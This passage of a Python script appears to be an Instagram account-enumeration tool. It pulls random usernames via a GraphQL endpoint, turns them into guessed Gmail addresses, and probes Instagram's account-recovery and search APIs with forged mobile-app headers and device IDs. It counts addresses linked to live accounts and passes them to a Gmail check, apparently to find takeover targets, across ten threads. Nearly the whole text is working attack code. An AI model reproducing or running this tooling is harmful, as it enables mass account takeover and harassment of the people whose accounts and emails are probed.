    payload = f"signed_body={Variable.sgin}.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%22{Variable.num}%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22_csrftoken%22%3A%22{Variable.csr}%22%2C%22q%22%3A%22{email}%22%2C%22guid%22%3A%22{uuid.uuid4()}%22%2C%22device_id%22%3A%22{Variable.android}%22%2C%22directly_sign_in%22%3A%22true%22%7D&ig_sig_key_version=4"
    headers = {
        'User-Agent': str(Agent.user()),
        'Accept-Encoding': "gzip, deflate",
        'Content-Type': "application/x-www-form-urlencoded",
        'X-Pigeon-Session-Id': str(uuid.uuid4()),
        'X-Pigeon-Rawclienttime': str("{:.3f}".format(time.time())),
        'X-IG-Connection-Speed': "-1kbps",
        'X-IG-Bandwidth-Speed-KBPS': "-1.000",
        'X-IG-Bandwidth-TotalBytes-B': "0",
        'X-IG-Bandwidth-TotalTime-MS': "0",
        'X-Bloks-Version-Id': "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
        'X-IG-Connection-Type': "MOBILE(LTE)",
        'X-IG-Capabilities': "3brTvw==",
        'X-IG-App-ID': "567067343352427",
        'Accept-Language': "ar-YE, en-US",
        'X-FB-HTTP-Engine': "Liger",
    }
    try:     
        res = requests.post(url, data=payload, headers=headers).text
        
        if '"status":"ok"' in res and f'{email}' in res:
            gg += 1
            PLAY()
            check_gmail(email)
        elif '"message":"لم يتم العثور على مستخدمين","status":"fail"' in res:
           bb += 1
           PLAY()
        else:       	
            Login(email)

    except:
        Login(email)
        

def arman(email):
    global gg, bb
    url = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/"
    payload = "params=%7B%22client_input_params%22%3A%7B%22text_input_id%22%3A%22616z6k%3A71%22%2C%22was_headers_prefill_available%22%3A0%2C%22sfdid%22%3A%22%22%2C%22fetched_email_token_list%22%3A%7B%7D%2C%22search_query%22%3A%22"+email+"%22%2C%22android_build_type%22%3A%22release%22%2C%22accounts_list%22%3A%5B%5D%2C%22ig_android_qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%2C%22ig_oauth_token%22%3A%5B%5D%2C%22is_whatsapp_installed%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%2C%22lara_override%22%3A%22%22%7D%2C%22was_headers_prefill_used%22%3A0%2C%22headers_infra_flow_id%22%3A%22%22%2C%22fetched_email_list%22%3A%5B%5D%2C%22sso_accounts_auth_data%22%3A%5B%5D%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22event_request_id%22%3A%22b8a5a2be-1abe-40da-b476-3d893c871e21%22%2C%22is_from_logged_out%22%3A0%2C%22layered_homepage_experiment_group%22%3Anull%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22waterfall_id%22%3A%22017145b8-cb79-439a-9036-2fb580f40ca0%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A3.6480220400074E13%2C%22is_platform_login%22%3A0%2C%22context_data%22%3A%22AR2rfU7knJNQCBz3hzsomH487qVyGu0HOVx3jgM-6G69fIwxA73vDmSlV7vY-W2aR4sv08iPPcsbdDt7RQF0ijGeqPudYXN0zlEZMvLeGOEvM_HHTtEJuv8dHDd4c8AIk4VpoaEASAIC9T_OS4yHwzupVtJKe7ghZ7k0y3kHeS7OGhaAIm4QvqfWW5JendkDb0mWJ31hcpuhEp8qcbdjJ27ABYmh7-MltY9OrlgAoBsSZuz8_MD3S1XQFV0I52liYk8fK_tSI9x4Ok0lTmIWJ4aN8pjQvxGhAWLJ73ONhBVfpIXE2xuutHN4eMrjKARC2-XcGRmg7pf3xLfGu_Z7zKiKrVmR8LQz91dwiKHFaND6DeHwVcARkBjYm0YLjaGdT-0FIeGYFs1x%7Carm%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22offline_experiment_group%22%3A%22caa_launch_ig4a_combined_60_percent%22%2C%22INTERNAL_INFRA_THEME%22%3A%22default%2Cdefault%22%2C%22access_flow_version%22%3A%22F2_FLOW%22%2C%22is_from_logged_in_switcher%22%3A0%2C%22qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%228ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb"
    headers = {
  'User-Agent': str(Agent.user()),
 # 'Accept-Encoding': "zstd, gzip, deflate",
  'x-ig-app-locale': "en-US",
  'x-ig-device-locale': "en-US",
  'x-ig-mapped-locale': "en-US",
  'x-pigeon-session-id': "UFS-42175dfd-8675-4443-8f8d-7f09fa7ea9da-0",
  'x-pigeon-rawclienttime': "1725835735.847",
  'x-ig-bandwidth-speed-kbps': "-1.000",
  'x-ig-bandwidth-totalbytes-b': "0",
  'x-ig-bandwidth-totaltime-ms': "0",
  'x-bloks-version-id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
  'x-ig-www-claim': "0",
  'x-bloks-is-layout-rtl': "true",
  'x-ig-device-id': "8745a4a2-a663-4bc7-9b3b-16d5b8ea20b9",
  'x-ig-family-device-id': "2586e714-fdb4-4741-ba7b-0b84b13e2a97",
  'x-ig-android-id': "android-bf1b282ab2b0b445",
  'x-ig-timezone-offset': "10800",
  'x-fb-connection-type': "MOBILE.LTE",
  'x-ig-connection-type': "MOBILE(LTE)",
  'x-ig-capabilities': "3brTv10=",
  'x-ig-app-id': "567067343352427",
  'priority': "u=3",
  'accept-language': "en-US",
  'x-mid': "Zt4loQABAAFzGR1YLL2M9XOkL9El",
  'ig-intended-user-id': "0",
  'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
  'x-fb-http-engine': "Liger",
  'x-fb-client-ip': "True",
  'x-fb-server-cluster': "True"
}
    try:
      req = requests.post(url, data=payload, headers=headers).text
      
      if '"status":"ok"' in req:
        if "The password you entered is incorrect." in req or "We sent a code to your email. Enter that code to confirm your account." in req:
          gg += 1
          PLAY()
          check_gmail(email)
        elif "Please wait a few minutes before you try again." in req:
            Ch(email)
        else:
          bb += 1
          PLAY()
      else:
          Ch(email)
    except:
        Ch(email)
    





def get_username():
    global email
    while True:
        try:
            LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))            
            bol = json.dumps({"id": str(random.randrange(10000, 53186034340)), "render_surface": "PROFILE"})         
            response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD, 'User-Agent': str(UserAgentGenerator),}, data = {"lsd": LsD, "variables": bol, "doc_id": "25618261841150840"})
            username = response.json()['data']['user']['username']     
            
            email = username + "@gmail.com"    
            arman(email)            
        except:
            
            pass
                   

threads = []
for i in range(10):
    t = threading.Thread(target=get_username)
    threads.append(t)
    t.start()
for t in threads:
    t.join()      	 